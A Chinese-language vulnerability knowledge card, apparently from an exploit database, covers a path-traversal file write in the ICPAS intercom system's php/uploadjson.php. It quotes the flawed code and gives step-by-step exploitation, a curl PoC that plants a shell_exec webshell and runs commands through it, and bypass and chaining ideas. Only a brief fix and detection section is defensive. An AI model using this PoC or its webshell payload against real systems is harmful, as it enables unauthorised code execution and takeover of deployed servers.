---
id: web-generic-file-upload-icpas-uploadjson-path-traversal-arbitrary-write
title: ICPAS php/uploadjson.php filename 未过滤：fopen(dirname(dirname(__FILE__))\lan\filename) 路径穿越任意写 webshell
type: scenario
domain: web
path: web/generic/file-upload
technique: icpas-uploadjson-path-traversal-arbitrary-write
aliases:
- ICPAS uploadjson 任意文件写入
- IP 网络对讲广播系统路径穿越写
- lan 目录 fopen fwrite
- jsondata[filename] 路径穿越
tags:
- php
- arbitrary-file-write
- path-traversal
- webshell
- rce
- icpas
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T07:07:26+08:00'
  notes: 已对照原文 uploadjson.php 代码片段（filename/data、fopen w）核对；与 getjson.php 为不同端点、不同原语（写 vs 读），dup-scan 的 likely_duplicate 不成立，两卡并列保留；原文未实际写入验证，confidence medium 合理。
---

## 一句话结论

ICPAS 的 `php/uploadjson.php` 从 `jsondata[filename]` 取文件名，直接拼到 `dirname(dirname(__FILE__)) . "\\lan\\" . $filename` 后用 `fopen($fullpath, 'w')` 写入 `jsondata[data]` 的内容；filename 未做路径规范化，可用 `..\` 穿越到 Web 目录写入 PHP 文件，形成任意文件写入与代码执行。

## 原理

- 关键代码：

```php
if (isset($postData['filename']) && isset($postData['data'])) {
    $filename = $postData['filename'];
    $fullpath = dirname(dirname(__FILE__)) . "\\lan\\" . $filename;
    ...
    $handle = fopen($fullpath, 'w');
    ...
    fwrite($handle, $content);
}
```

- `dirname(dirname(__FILE__))` 是当前 PHP 文件的祖父目录（通常为 Web 根），再拼 `\lan\`；`$filename` 来自 POST，没有 `basename()`、没有 `realpath()` 基准目录校验，也没有过滤 `..`。
- 攻击者传入 `..\php\backdoor.php` 即可跳出 `lan` 目录，把内容写到 Web 根的 `php/` 目录；传 `..\..\backdoor.php` 等可进一步调整落点（取决于实际 Web 根层级）。
- 写入内容 `jsondata[data]` 完全可控，写一个 `<?php echo shell_exec($_GET['cmd']); ?>` 即可获得 webshell。
- 文章 AI 审计给出的 PoC 使用 `jsondata[filename]=..\php\backdoor.php` 与 `jsondata[data]=<?php echo shell_exec($_GET["cmd"]);?>`，随后访问 `/php/backdoor.php?cmd=whoami`。

## 触发条件

- `php/uploadjson.php` 可访问（原文未说明鉴权要求）。
- Web 进程对目标目录有写权限（`lan` 目录与 Web 目录通常可写）。
- Windows 目标使用反斜杠路径（原文安装于 `C:\ICPAS`）；Linux 目标需改用 `/` 与相应相对路径。

## 利用步骤

1. 确认 `uploadjson.php` 接受 `jsondata[filename]` 与 `jsondata[data]`。
2. 先用无害文件名写入 `..\php\test.txt` 验证路径与写权限。
3. 写入 PHP webshell：filename 指向 Web 可访问目录，data 为 PHP 代码。
4. 访问写入的文件执行命令；若路径不对，根据报错或目录结构增减 `..\` 层级。

## PoC

```bash
curl -s -X POST 'http://target/php/uploadjson.php' \
  --data-urlencode 'jsondata[filename]=..\php\backdoor.php' \
  --data-urlencode 'jsondata[data]=<?php echo shell_exec($_GET["cmd"]);?>'

curl -s 'http://target/php/backdoor.php?cmd=whoami'
```

## 变体与关联

- **路径层级**：`$fullpath` 基准是 `dirname(dirname(__FILE__))\lan\`，实际穿越层数取决于 `uploadjson.php` 在 Web 根下的位置；原文 AI 报告中也出现 `..\..\backdoor.php` 的写法。
- **内容格式**：若 `fwrite` 前对内容做了 JSON 解码/过滤，可用 `php://filter`、短标签或 `.htaccess`/`.user.ini` 等方式绕过（取决于实现）。
- **关联**：与本系统 `addscenedata.php` 上传、`ping.php` 命令注入卡可组合；写入 `.user.ini` 或 `.htaccess` 可在无法直接写 PHP 时扩大利用面。

## 检测与防御

- **修复**：使用 `basename($filename)` 去掉路径；用 `realpath()` 校验目标必须位于固定 `lan` 目录内；扩展名白名单；禁止写入可执行脚本目录。
- **加固**：`lan`/上传目录移出 Web 根或禁止脚本解析；Web 进程最小权限。
- **检测**：监控 `uploadjson.php` 请求中的 `..`、`/`、`\` 与 PHP 标签内容；审计 Web 目录新增的可执行文件。
